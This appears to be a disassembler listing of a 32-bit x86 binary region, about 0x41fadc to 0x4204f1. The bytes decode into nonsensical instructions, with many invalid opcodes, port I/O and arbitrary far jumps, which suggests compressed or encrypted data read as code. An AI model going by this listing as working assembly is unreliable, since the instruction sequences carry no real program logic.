  41fadc:	leave  
  41fadd:	mov    DWORD PTR [ebp-0x4c],eax
  41fae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fae1:	cmp    esp,esi
  41fae3:	test   al,0xce
  41fae5:	push   ebp
  41fae6:	xchg   ebp,eax
  41fae7:	test   DWORD PTR [eax-0x58],esi
  41faea:	lahf   
  41faeb:	(bad)  
  41faec:	cld    
  41faed:	and    cl,BYTE PTR ds:0x14d62746
  41faf3:	test   eax,0x86e27587
  41faf8:	lods   eax,DWORD PTR ds:[esi]
  41faf9:	pop    eax
  41fafa:	outs   dx,BYTE PTR ds:[esi]
  41fafb:	addr16 mov ecx,0xad9aabb2
  41fb01:	dec    edi
  41fb02:	sbb    eax,0xfabc9dd7
  41fb07:	pop    ecx
  41fb08:	fnstenv [eax-0x5420e7dd]
  41fb0e:	gs sub edi,edx
  41fb11:	mov    ebp,DWORD PTR [eax-0x64f8631b]
  41fb17:	mov    ecx,0xd5efbac6
  41fb1c:	das    
  41fb1d:	scas   eax,DWORD PTR es:[edi]
  41fb1e:	push   DWORD PTR [edi+0x53]
  41fb21:	or     eax,0x968a20f8
  41fb26:	test   DWORD PTR [eax],edi
  41fb28:	adc    al,0x1d
  41fb2a:	out    dx,al
  41fb2b:	lds    esp,FWORD PTR [esi-0x6d]
  41fb2e:	xchg   esp,eax
  41fb2f:	mov    cl,0x48
  41fb31:	and    eax,0x765a8f7e
  41fb36:	outs   dx,DWORD PTR ss:[esi]
  41fb38:	(bad)  
  41fb39:	push   ebp
  41fb3a:	ret    
  41fb3b:	inc    eax
  41fb3c:	jmp    FWORD PTR [eax+0x126fab32]
  41fb42:	jae    0x41fad3
  41fb44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb45:	pop    esp
  41fb46:	sub    dl,cl
  41fb48:	push   esi
  41fb49:	jmp    0x6f3b8d2f
  41fb4e:	imul   esp,DWORD PTR [edx+edx*2-0x65],0x50
  41fb53:	lock push ebx
  41fb55:	add    eax,esp
  41fb57:	test   ah,al
  41fb59:	std    
  41fb5a:	hlt    
  41fb5b:	sar    DWORD PTR [edi],0xbf
  41fb5e:	pop    ecx
  41fb5f:	das    
  41fb60:	cmp    BYTE PTR [edi-0x6248404a],al
  41fb66:	inc    esi
  41fb67:	or     dl,BYTE PTR es:0x31515f2
  41fb6e:	ins    DWORD PTR es:[edi],dx
  41fb6f:	loopne 0x41fb5a
  41fb71:	ins    DWORD PTR es:[edi],dx
  41fb72:	xchg   edi,eax
  41fb73:	mov    edx,0x411b2d4e
  41fb78:	enter  0x7a58,0xc3
  41fb7c:	mov    esi,fs
  41fb7e:	mov    ds:0xa8da3a96,eax
  41fb83:	or     DWORD PTR [edi+eiz*4+0x27257c],edi
  41fb8a:	inc    ebp
  41fb8b:	cdq    
  41fb8c:	adc    DWORD PTR [eax],esp
  41fb8e:	push   ebx
  41fb8f:	popf   
	...
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	xor    bl,ah
  41fc02:	rol    BYTE PTR [ebp+0x151d4],1
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	pop    ecx
  41fc0d:	in     eax,0x6a
  41fc0f:	xchg   ecx,eax
  41fc10:	xchg   esi,eax
  41fc11:	mov    ds,edi
  41fc13:	jle    0x41fc76
  41fc15:	daa    
  41fc16:	mov    eax,0x61096227
  41fc1b:	mov    dl,0xaf
  41fc1d:	cmp    al,0x14
  41fc1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc20:	or     esi,ecx
  41fc22:	mov    DWORD PTR [edi],ebx
  41fc24:	jmp    0x41fbb1
  41fc26:	xor    eax,0xb08425d8
  41fc2b:	sar    ebp,cl
  41fc2d:	lea    edx,[edx]
  41fc2f:	xchg   ebp,eax
  41fc30:	and    DWORD PTR [edi+0x74a9d5e9],esp
  41fc36:	bound  esp,QWORD PTR [edi]
  41fc38:	cmp    BYTE PTR [ebp+0x14d8e4c1],bh
  41fc3e:	xchg   esp,eax
  41fc3f:	pushf  
  41fc40:	inc    esi
  41fc41:	fistp  WORD PTR [edx+0x1cd8452d]
  41fc47:	sti    
  41fc48:	push   ss
  41fc49:	mov    ecx,0xd8cbbb21
  41fc4e:	in     eax,0xe
  41fc50:	adc    ah,BYTE PTR [edx-0x68]
  41fc53:	inc    ebp
  41fc54:	pop    ebp
  41fc55:	add    ah,cl
  41fc57:	mov    ds:0x6232197d,eax
  41fc5c:	sbb    DWORD PTR [ebx-0x25],ebp
  41fc5f:	inc    ebx
  41fc60:	dec    ecx
  41fc61:	sbb    DWORD PTR [eax],eax
  41fc63:	cdq    
  41fc64:	jb     0x41fc1e
  41fc66:	or     DWORD PTR [eax-0x374bb3db],0xa95cbed1
  41fc70:	mov    ds:0x35b677e5,al
  41fc75:	mov    ecx,0xa804f7dd
  41fc7a:	lods   al,BYTE PTR ds:[esi]
  41fc7b:	std    
  41fc7c:	push   ds
  41fc7d:	and    al,0x90
  41fc7f:	xor    ah,BYTE PTR [esi-0x75]
  41fc82:	aad    0x99
  41fc84:	aas    
  41fc85:	jmp    0x86aa:0x8057cdf9
  41fc8c:	lea    edx,[esi]
  41fc8e:	xchg   edx,eax
  41fc8f:	jecxz  0x41fc94
  41fc91:	pop    es
  41fc92:	sti    
  41fc93:	cdq    
  41fc94:	inc    esi
  41fc95:	leave  
  41fc96:	lods   al,BYTE PTR ds:[esi]
  41fc97:	xchg   ebp,eax
  41fc98:	(bad)  
  41fc99:	cmp    al,0x48
  41fc9b:	in     eax,dx
  41fc9c:	push   esi
  41fc9d:	in     eax,dx
  41fc9e:	inc    esp
  41fc9f:	add    BYTE PTR [di-0x7825],ah
  41fca4:	stc    
  41fca5:	jns    0x41fc5e
  41fca7:	imul   ebp,DWORD PTR [edx],0x10c5b15a
  41fcad:	dec    ebx
  41fcae:	std    
  41fcaf:	imul   eax,DWORD PTR [edx],0x30
  41fcb2:	lds    ebp,FWORD PTR [ebx-0x74]
  41fcb5:	adc    DWORD PTR ds:0xea2a27b9,esi
  41fcbb:	aaa    
  41fcbc:	mov    dh,0xfc
  41fcbe:	stos   DWORD PTR es:[edi],eax
  41fcbf:	jl     0x41fcd7
  41fcc1:	aad    0xd
  41fcc3:	test   DWORD PTR gs:[eax],ecx
  41fcc6:	xchg   ebx,eax
  41fcc7:	out    0x14,al
  41fcc9:	or     ecx,DWORD PTR [edi]
  41fccb:	dec    eax
  41fccc:	outs   dx,BYTE PTR ds:[esi]
  41fcce:	adc    eax,0xcc2096fd
  41fcd3:	icebp  
  41fcd4:	stos   BYTE PTR es:[edi],al
  41fcd5:	rcr    BYTE PTR [eax+0x41],0x6a
  41fcd9:	mov    DWORD PTR [eax-0x3c],esp
  41fcdc:	test   ebx,edi
  41fcde:	sbb    dh,ch
  41fce0:	pop    esp
  41fce1:	mov    bl,BYTE PTR [eax+edx*1]
  41fce4:	mov    bl,0xf5
  41fce6:	(bad)
  41fcea:	repnz pop ebp
  41fcec:	fidiv  DWORD PTR [edx+ebp*8]
  41fcef:	jno    0x41fc7b
  41fcf1:	outs   dx,DWORD PTR ds:[esi]
  41fcf2:	ins    DWORD PTR es:[edi],dx
  41fcf3:	(bad)  
  41fcf4:	adc    ebx,DWORD PTR [eax+0x4c]
  41fcf7:	cmp    DWORD PTR [eax+0x58],ecx
  41fcfa:	adc    ecx,esi
  41fcfc:	rcl    ebx,0x96
  41fcff:	and    DWORD PTR [edi+edx*1],edi
  41fd02:	cmp    BYTE PTR [ebx+esi*2-0x6a],cl
  41fd06:	dec    ebx
  41fd07:	in     eax,0xa8
  41fd09:	pop    eax
  41fd0a:	mov    eax,ds:0x6eacc089
  41fd0f:	test   DWORD PTR [eax],0x0
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	mov    cs,esp
  41fd82:	jb     0x41fe03
  41fd84:	fcom   DWORD PTR [edx+0x1]
  41fd87:	add    BYTE PTR [ecx+eax*1],al
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	(bad)  
  41fd8d:	mov    esp,edx
  41fd8f:	jecxz  0x41fd92
  41fd91:	push   esp
  41fd92:	and    edx,DWORD PTR [eax+esi*4-0x6d70d6d1]
  41fd99:	sub    eax,0xaf929bee
  41fd9e:	mov    esp,0x60f31d3a
  41fda3:	adc    bl,BYTE PTR [ebx+0x2d4c4f30]
  41fda9:	shl    ebp,cl
  41fdab:	lods   al,BYTE PTR ds:[esi]
  41fdac:	iret   
  41fdad:	adc    edi,DWORD PTR [edi+ecx*4+0x3b]
  41fdb1:	push   0xffffffd4
  41fdb3:	push   esp
  41fdb4:	pop    esi
  41fdb5:	cmc    
  41fdb6:	gs dec edi
  41fdb8:	mov    bl,0x9d
  41fdba:	pop    esp
  41fdbb:	mov    esi,DWORD PTR ss:[ebx-0xe]
  41fdbf:	vpmaddwd xmm3,xmm1,XMMWORD PTR fs:[eax-0x22]
  41fdc5:	scas   al,BYTE PTR es:[edi]
  41fdc6:	pushf  
  41fdc7:	js     0x41fd5f
  41fdc9:	jo     0x41fdc0
  41fdcb:	lahf   
  41fdcc:	aaa    
  41fdcd:	xchg   ebp,eax
  41fdce:	jp     0x41fe32
  41fdd0:	pop    es
  41fdd1:	mov    edx,0x2a392523
  41fdd6:	test   DWORD PTR ds:0x6e91eb8f,esp
  41fddc:	je     0x41fe03
  41fdde:	mov    WORD PTR [eax+eax*2+0x30f36ab5],gs
  41fde5:	rcl    ah,cl
  41fde7:	out    dx,eax
  41fde8:	jl     0x41fe56
  41fdea:	inc    esp
  41fdeb:	mov    edx,0x7355b573
  41fdf0:	sar    DWORD PTR [ebp+0x14],1
  41fdf3:	das    
  41fdf4:	push   0x358d0042
  41fdf9:	retf   
  41fdfa:	(bad)  
  41fdfb:	xor    cl,ch
  41fdfd:	sti    
  41fdfe:	aad    0xb5
  41fe00:	push   edx
  41fe01:	stos   BYTE PTR es:[edi],al
  41fe02:	jle    0x41fe44
  41fe04:	(bad)  
  41fe05:	adc    dh,BYTE PTR [edi+edx*1-0x45]
  41fe09:	push   0xffffffbf
  41fe0b:	aad    0x35
  41fe0d:	cwde   
  41fe0e:	out    dx,eax
  41fe0f:	test   BYTE PTR [ecx],al
  41fe11:	(bad)  
  41fe13:	mov    ebp,0x13b2ddb5
  41fe18:	daa    
  41fe19:	jns    0x41fde3
  41fe1b:	ins    BYTE PTR es:[edi],dx
  41fe1c:	pusha  
  41fe1d:	jle    0x41fe48
  41fe1f:	xchg   edx,eax
  41fe20:	nop
  41fe21:	mov    al,ds:0xec9748a7
  41fe26:	mov    ecx,0x9c659ced
  41fe2b:	xor    eax,0x3ab0d65e
  41fe30:	dec    esp
  41fe31:	mov    edi,0xdf8e71b
  41fe36:	in     al,dx
  41fe37:	dec    edi
  41fe38:	sbb    ebp,ebp
  41fe3a:	(bad)  
  41fe3b:	aam    0x50
  41fe3d:	cmc    
  41fe3e:	in     al,0x47
  41fe40:	jne    0x41fe1c
  41fe42:	fidivr DWORD PTR [edx+0x40]
  41fe45:	fwait
  41fe46:	push   eax
  41fe47:	xor    al,BYTE PTR [edx]
  41fe49:	scas   eax,DWORD PTR es:[edi]
  41fe4a:	aas    
  41fe4b:	rcr    BYTE PTR [edi],0x99
  41fe4e:	gs jo  0x41fe8d
  41fe51:	inc    edx
  41fe52:	dec    ebp
  41fe53:	rcr    DWORD PTR [edi],0xc6
  41fe56:	aas    
  41fe57:	jns    0x41feba
  41fe59:	std    
  41fe5a:	sbb    al,0x46
  41fe5d:	dec    ebp
  41fe5e:	mov    eax,0xb3e0832a
  41fe63:	mov    ebp,0x5271dd50
  41fe68:	(bad)  [edi-0x348529eb]
  41fe6e:	sub    eax,0x9729b7c5
  41fe73:	mov    ecx,0x5dc832eb
  41fe78:	and    eax,0x1b9aa622
  41fe7d:	mov    ch,0x55
  41fe7f:	test   BYTE PTR [esi-0x674fe78b],dh
  41fe85:	pop    eax
  41fe86:	push   ebp
  41fe87:	arpl   WORD PTR [edx],dx
  41fe89:	inc    eax
  41fe8a:	and    ecx,eax
  41fe8c:	mov    DWORD PTR [esi+0xa5ab],0x0
	...
  41fef2:	add    BYTE PTR [eax],al
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x5b
  41ff01:	push   esi
  41ff02:	jecxz  0x41ff53
  41ff04:	fcom   QWORD PTR [ebx+0x1]
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	mov    ?,WORD PTR [eax+0x5]
  41ff0f:	retf   0x165c
  41ff12:	adc    edx,DWORD PTR [edi-0x5e29e5e2]
  41ff18:	jae    0x41feb6
  41ff1a:	fdivp  st(5),st
  41ff1c:	cmp    ch,BYTE PTR [esi+0x55]
  41ff1f:	js     0x41fece
  41ff21:	mov    esi,esp
  41ff23:	in     eax,dx
  41ff24:	imul   esp,DWORD PTR [esi+0x6cefbf29],0xd2757cd4
  41ff2e:	push   esi
  41ff2f:	ror    DWORD PTR [esi],0x6b
  41ff32:	mov    edx,0xe03f8364
  41ff37:	sub    al,0x3c
  41ff39:	aaa    
  41ff3a:	or     dh,BYTE PTR [eax-0x614e217f]
  41ff40:	jl     0x41ff1f
  41ff42:	cs js  0x41ffb4
  41ff45:	push   eax
  41ff46:	xor    dh,bl
  41ff48:	jae    0x41ff6b
  41ff4a:	popf   
  41ff4b:	sbb    al,0x28
  41ff4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff4e:	cmp    eax,0xc0effaa9
  41ff53:	or     ebx,DWORD PTR [edi+esi*8]
  41ff56:	imul   esi,DWORD PTR [ebp-0xf],0x3410daf3
  41ff5d:	inc    eax
  41ff5e:	aad    0xe2
  41ff60:	fld    TBYTE PTR [edi-0x2f5b79a2]
  41ff66:	gs test cl,0x99
  41ff6a:	nop
  41ff6b:	and    DWORD PTR [eax+0x26],0xffffffe9
  41ff6f:	mov    WORD PTR [edx-0x613b79ed],es
  41ff75:	xor    al,0xfd
  41ff77:	ja     0x41ffa2
  41ff79:	mov    ds:0xc766e4b1,eax
  41ff7e:	les    esi,FWORD PTR [ebx]
  41ff80:	jmp    0xaef8:0x8fc6f5be
  41ff87:	push   ebp
  41ff88:	das    
  41ff89:	jecxz  0x41ff18
  41ff8b:	inc    esp
  41ff8c:	ss cwde 
  41ff8e:	(bad)  
  41ff8f:	std    
  41ff90:	adc    BYTE PTR [edi-0x25fefdd2],al
  41ff96:	stc    
  41ff97:	mov    eax,es:0x8a2f8d44
  41ff9d:	mov    ebx,0x59a1c2a3
  41ffa2:	bnd jb 0x42001d
  41ffa5:	lds    edi,FWORD PTR [ecx-0x3a]
  41ffa8:	jo     0x420002
  41ffaa:	dec    edi
  41ffac:	(bad)  
  41ffad:	loopne 0x420019
  41ffaf:	xchg   esp,eax
  41ffb0:	mov    al,0x28
  41ffb2:	call   0x5e6e:0x586a97b2
  41ffb9:	and    BYTE PTR [ecx-0x4b],0x70
  41ffbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffbe:	xor    eax,DWORD PTR [edx]
  41ffc0:	inc    ebp
  41ffc1:	jle    0x42003e
  41ffc3:	inc    esi
  41ffc4:	add    dl,BYTE PTR [edi+0x5ac3e72e]
  41ffca:	call   0xc7a608b3
  41ffcf:	add    DWORD PTR [ebx+0x3e],edi
  41ffd2:	mov    esp,edi
  41ffd4:	ins    BYTE PTR es:[edi],dx
  41ffd5:	mov    ch,0x3f
  41ffd7:	mov    dh,0xf3
  41ffd9:	mov    bl,0x35
  41ffdb:	sahf   
  41ffdc:	popa   
  41ffdd:	mov    eax,ds:0x15979484
  41ffe2:	dec    ebx
  41ffe3:	popf   
  41ffe4:	mov    al,ds:0x91d3fccb
  41ffe9:	bound  ecx,QWORD PTR [eax+0x9]
  41ffec:	shr    DWORD PTR [ecx],1
  41ffee:	or     eax,0x9ee9d090
  41fff3:	sbb    esp,DWORD PTR [ebx]
  41fff5:	push   esp
  41fff6:	das    
  41fff7:	(bad)  
  41fff8:	pusha  
  41fff9:	loope  0x42005c
  41fffb:	scas   al,BYTE PTR es:[edi]
  41fffc:	sub    al,0xa1
  41fffe:	gs js  0x41ffd1
  420001:	out    dx,eax
  420002:	adc    eax,0xfe7a4ef4
  420007:	xchg   ecx,eax
  420008:	jge    0x41ffef
  42000a:	iret   
  42000b:	sbb    al,0xcf
  42000d:	sbb    ecx,eax
  42000f:	iret   
	...
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x63
  420081:	mov    BYTE PTR [ebp+eax*1+0x154e0],ah
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	sub    al,0x3e
  42008e:	aad    0x3c
  420090:	push   es
  420091:	cdq    
  420092:	push   esp
  420093:	xchg   esi,eax
  420094:	imul   esi,eax,0x53
  420097:	sbb    esi,DWORD PTR [edx-0x12]
  42009a:	clc    
  42009b:	sti    
  42009c:	mov    edx,DWORD PTR [esi*2+0x27ebbad2]
  4200a3:	mov    ax,ds:0xb0281913
  4200a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200aa:	mov    bh,0xaa
  4200ac:	pop    ss
  4200ad:	div    BYTE PTR [edi-0x63]
  4200b0:	(bad)  
  4200b2:	call   0x90a5:0xc650783e
  4200b9:	adc    eax,0xaad797db
  4200be:	scas   eax,DWORD PTR es:[edi]
  4200bf:	mov    al,ds:0x3986fabc
  4200c4:	hlt    
  4200c5:	push   ss
  4200c6:	dec    esp
  4200c7:	in     eax,dx
  4200c8:	rol    BYTE PTR [eax+esi*4],0x2f
  4200cc:	imul   esp,DWORD PTR [edx-0x7f88064e],0x56bfe925
  4200d6:	leave  
  4200d7:	push   cs
  4200d8:	cmc    
  4200d9:	iret   
  4200da:	xchg   ecx,eax
  4200db:	lock add edx,edx
  4200de:	int    0xc9
  4200e0:	les    ebx,FWORD PTR [edi]
  4200e2:	pop    edx
  4200e3:	push   cs
  4200e4:	jb     0x420088
  4200e6:	cmp    al,0x65
  4200e8:	adc    ecx,edx
  4200ea:	(bad)  
  4200eb:	les    ebp,FWORD PTR ds:0x3b93a9f8
  4200f1:	out    dx,eax
  4200f2:	cmp    esp,DWORD PTR [ecx+0x1b905903]
  4200f8:	sbb    eax,0x25e0cb91
  4200fd:	add    DWORD PTR [ecx],0xffffffd2
  420100:	out    dx,eax
  420101:	pop    ebx
  420102:	ror    BYTE PTR [ebx-0x75],0xb2
  420106:	ja     0x4200eb
  420108:	mov    ds:0x31c9bd6,al
  42010d:	in     eax,0x84
  42010f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420110:	dec    eax
  420111:	inc    edx
  420112:	das    
  420113:	mov    dl,0xd8
  420115:	mov    dl,0x39
  420117:	mov    cs,WORD PTR [edi-0x4c]
  42011a:	mov    ss,WORD PTR [eax-0x3b]
  42011d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42011e:	sbb    DWORD PTR ds:0xb2041bcd,0xffffffda
  420125:	dec    ebp
  420126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420127:	sti    
  420128:	hlt    
  420129:	ds mov dh,0x5c
  42012c:	(bad)  
  42012d:	mov    BYTE PTR [ebx],bl
  42012f:	jmp    0x420102
  420131:	mov    ebx,0xcc43d61c
  420136:	out    dx,eax
  420137:	out    dx,eax
  420138:	gs inc ebx
  42013a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42013b:	(bad)  
  42013c:	leave  
  42013d:	push   esi
  42013e:	mov    ebp,edx
  420140:	loop   0x4200cc
  420142:	enter  0x5eca,0xa3
  420146:	adc    esi,DWORD PTR [eax]
  420148:	sub    eax,edx
  42014a:	mov    ?,edi
  42014c:	inc    esi
  42014d:	cmp    cl,BYTE PTR [esi+0xa00fe35]
  420153:	jmp    0x2479:0xaae18e6a
  42015a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42015b:	daa    
  42015c:	jp     0x42012e
  42015e:	icebp  
  42015f:	and    eax,0xc071969
  420164:	jecxz  0x42018c
  420166:	test   al,0x65
  420168:	xchg   ebp,eax
  420169:	and    bl,BYTE PTR [edx+0x61]
  42016c:	adc    ebp,DWORD PTR [eax]
  42016e:	sar    DWORD PTR [ebp-0x49],0xa7
  420172:	je     0x4201d9
  420174:	fcmovne st,st(7)
  420176:	arpl   WORD PTR [esi],di
  420178:	cmp    dl,dh
  42017a:	std    
  42017b:	cmp    eax,0x4f88e063
  420180:	dec    esi
  420181:	pop    ss
  420182:	mov    ds:0x75877202,eax
  420187:	adc    esp,ebp
  420189:	cmp    BYTE PTR [eax-0x1ed51caf],ch
  42018f:	dec    edi
	...
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x1dc6d58c],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	sub    BYTE PTR [edx+eax*1-0x1223007b],cl
  420213:	pop    esi
  420214:	(bad)  
  420215:	dec    eax
  420216:	jmp    0xda541741
  42021b:	inc    esp
  42021c:	push   ecx
  42021d:	jo     0x4201a2
  42021f:	inc    edi
  420220:	popf   
  420221:	dec    esi
  420222:	std    
  420223:	das    
  420224:	in     eax,0x8
  420226:	xchg   esp,eax
  420227:	mov    ah,0xbe
  420229:	cli    
  42022a:	movsx  ecx,WORD PTR [edi]
  42022d:	jl     0x42027e
  42022f:	xchg   esp,eax
  420231:	add    BYTE PTR [ecx],bl
  420233:	mov    dl,0xf7
  420235:	sub    BYTE PTR [ebx+0x18],0x81
  420239:	jbe    0x4201cf
  42023b:	mov    al,0xde
  42023d:	add    DWORD PTR [esi],esp
  42023f:	mov    ch,0xd3
  420241:	dec    esi
  420242:	jl     0x420269
  420244:	jg     0x420281
  420246:	je     0x42026a
  420248:	out    0xa7,eax
  42024a:	data16 test al,0xc7
  42024d:	and    dl,BYTE PTR [eax-0xe]
  420250:	adc    bl,ah
  420252:	add    al,0x40
  420254:	pop    es
  420255:	rol    ebp,0x93
  420258:	sbb    edi,DWORD PTR [ebp-0x18]
  42025b:	shl    DWORD PTR ds:0x24b2a00b,0x47
  420262:	addr16 and al,0x37
  420265:	xor    ah,BYTE PTR [edx+0x49c63570]
  42026b:	mov    dh,0x52
  42026d:	call   0x4112:0xc50bef39
  420274:	nop
  420275:	jbe    0x420250
  420277:	aas    
  420278:	dec    edx
  420279:	in     eax,dx
  42027a:	sub    ah,BYTE PTR [ecx+0x1fc38770]
  420280:	nop
  420281:	xor    eax,0x41c6131e
  420286:	or     al,0xc6
  420288:	shl    BYTE PTR [ebx+0x634a8c0],cl
  42028e:	retf   0xb995
  420291:	repz and eax,0x683b30e8
  420297:	pop    eax
  420298:	outs   dx,DWORD PTR ds:[esi]
  420299:	push   0x267327d5
  42029e:	push   esp
  42029f:	pop    es
  4202a0:	sub    esi,DWORD PTR [esi]
  4202a2:	push   eax
  4202a3:	cmc    
  4202a4:	xor    BYTE PTR ds:0x89868e54,al
  4202aa:	fst    QWORD PTR [edx-0x28218719]
  4202b0:	mov    bh,0x67
  4202b2:	add    dl,0x4c
  4202b5:	cmc    
  4202b6:	xor    eax,0xc06f7a5b
  4202bb:	jo     0x4202f4
  4202bd:	daa    
  4202be:	(bad)  
  4202bf:	in     eax,dx
  4202c0:	push   esi
  4202c1:	stos   BYTE PTR es:[edi],al
  4202c2:	dec    ebp
  4202c3:	dec    esi
  4202c4:	xchg   ebx,eax
  4202c5:	call   0xa3dc:0x722abddb
  4202cc:	jmp    0x6bda:0xa8d039d5
  4202d3:	pop    es
  4202d4:	icebp  
  4202d5:	xor    BYTE PTR [ebp+eax*1-0x784b9545],ch
  4202dc:	inc    ebp
  4202dd:	mov    ds:0xc2557a69,eax
  4202e2:	test   bl,dl
  4202e4:	push   esi
  4202e5:	ret    0x543a
  4202e8:	je     0x42026f
  4202ea:	enter  0x257b,0x8c
  4202ee:	and    ecx,ecx
  4202f0:	psubusb mm1,QWORD PTR [esi-0x26d2a86e]
  4202f7:	mov    ?,WORD PTR [edi]
  4202f9:	je     0x42035f
  4202fb:	pop    esp
  4202fc:	test   al,0x2f
  4202fe:	pushf  
  4202ff:	jl     0x420322
  420301:	adc    BYTE PTR fs:[eax],dl
  420304:	push   esp
  420305:	inc    edx
  420306:	std    
  420307:	les    esp,FWORD PTR [esi-0x67]
  42030a:	fimul  WORD PTR [edx]
  42030c:	jo     0x42031d
  42030e:	scas   al,BYTE PTR es:[edi]
  42030f:	jae    0x420311
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420381:	xor    eax,0x56e83ad0
  420386:	add    DWORD PTR [eax],eax
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	sar    BYTE PTR [eax-0x65],1
  42038f:	xor    BYTE PTR [ebp-0x17],ah
  420392:	xor    ecx,ecx
  420394:	add    BYTE PTR [eax],0xf3
  420397:	cs pop es
  420399:	dec    ebp
  42039a:	sub    eax,0x119118b4
  42039f:	fst    DWORD PTR [ecx-0x58a03fcd]
  4203a5:	ss and al,0x50
  4203a8:	pop    esi
  4203a9:	scas   al,BYTE PTR es:[edi]
  4203aa:	test   ah,dl
  4203ac:	xchg   ecx,eax
  4203ad:	loope  0x4203cb
  4203af:	or     BYTE PTR [ecx-0x40],bh
  4203b2:	arpl   di,di
  4203b4:	jbe    0x4203e6
  4203b6:	call   0x64d9:0x7620e390
  4203bd:	mov    ds:0x8e9e9ce6,al
  4203c2:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4203c4:	les    esp,FWORD PTR [ebx]
  4203c6:	daa    
  4203c7:	dec    eax
  4203c8:	or     BYTE PTR [edx+0x2a0ebb7f],dh
  4203ce:	pop    ecx
  4203cf:	(bad)  
  4203d0:	jb     0x4203b2
  4203d2:	push   0x240ff856
  4203d7:	jmp    0x296533b7
  4203dc:	inc    ebp
  4203dd:	sbb    eax,0x4ed8baea
  4203e2:	repnz (bad) 
  4203e4:	pop    esp
  4203e5:	cmp    eax,esi
  4203e7:	sub    eax,0x85fd44ec
  4203ec:	pusha  
  4203ed:	dec    esi
  4203ee:	sbb    cl,dl
  4203f0:	imul   ebp,DWORD PTR [edx],0x280b8515
  4203f6:	loop   0x42042c
  4203f8:	push   ds
  4203f9:	lock iret 
  4203fb:	(bad)  
  4203fc:	jno    0x420469
  4203fe:	push   ebp
  4203ff:	lods   eax,DWORD PTR ds:[esi]
  420400:	mov    ebx,0xd9e89f86
  420405:	jmp    0x4203eb
  420407:	cmp    eax,0xf135468
  42040c:	scas   eax,DWORD PTR es:[edi]
  42040d:	adc    DWORD PTR ds:0x5c08620c,ebx
  420413:	mov    ah,0x6a
  420415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420416:	inc    esp
  420417:	ds and esi,ebx
  42041a:	mov    edx,DWORD PTR [ebx]
  42041c:	sbb    edi,DWORD PTR [ebx-0x53]
  42041f:	dec    ecx
  420420:	ss hlt 
  420422:	(bad)  
  420423:	adc    edx,DWORD PTR [edx+esi*4+0x42c7e05d]
  42042a:	aaa    
  42042b:	adc    BYTE PTR [ebx+0x7f],cl
  42042e:	ror    BYTE PTR [edx],0x56
  420431:	test   BYTE PTR [ecx-0x4eccaaa7],ah
  420437:	xchg   BYTE PTR [edx+0x408c7226],bl
  42043d:	jne    0x42049f
  42043f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420440:	mov    bh,0x36
  420442:	ror    edi,1
  420444:	test   al,0x65
  420446:	int3   
  420447:	fnstsw WORD PTR [ebx]
  420449:	in     eax,0x71
  42044b:	push   ds
  42044c:	mov    ds:0xdce65cb4,eax
  420451:	fdiv   st,st(3)
  420453:	and    ah,BYTE PTR [ecx]
  420455:	fild   DWORD PTR [ebx]
  420457:	into   
  420458:	fistp  WORD PTR [edx+0x19509eae]
  42045e:	adc    DWORD PTR [edi],eax
  420460:	add    BYTE PTR [edx+0x2f9ee6b],dl
  420466:	jge    0x420454
  420468:	fbstp  TBYTE PTR [ecx+ecx*4]
  42046b:	pop    ebp
  42046c:	lods   eax,DWORD PTR ds:[esi]
  42046d:	iret   
  42046e:	ja     0x420445
  420470:	mov    ds:0x44f7d943,eax
  420475:	shr    DWORD PTR [edx+ecx*1-0x25056865],1
  42047c:	dec    ebp
  42047d:	std    
  42047e:	add    ebx,esi
  420480:	fldcw  WORD PTR ds:0xd12f1e02
  420486:	add    DWORD PTR [edx+0x10],edi
  420489:	add    BYTE PTR [ecx-0x4b8eedb7],dl
  42048f:	jno    0x420491
	...
  4204f1:	add    BYTE PTR [eax],al
